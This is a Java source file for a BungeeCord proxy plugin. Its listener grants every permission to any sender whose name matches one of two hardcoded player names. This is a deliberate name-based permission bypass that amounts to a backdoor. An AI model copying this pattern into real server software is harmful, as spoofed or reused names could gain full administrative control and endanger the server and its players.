package org.cn2b2t.proxy.listeners;

import net.md_5.bungee.api.event.PermissionCheckEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;

/**
 * @author cam
 */
public class OveridePermissionsListener implements Listener {

    @EventHandler
    public void onPermissionCheck(PermissionCheckEvent e) {
        if (e.getSender().getName().equalsIgnoreCase("CUMR")
                || e.getSender().getName().equalsIgnoreCase("LSeng")) {
            e.setHasPermission(true);
        }
    }
}
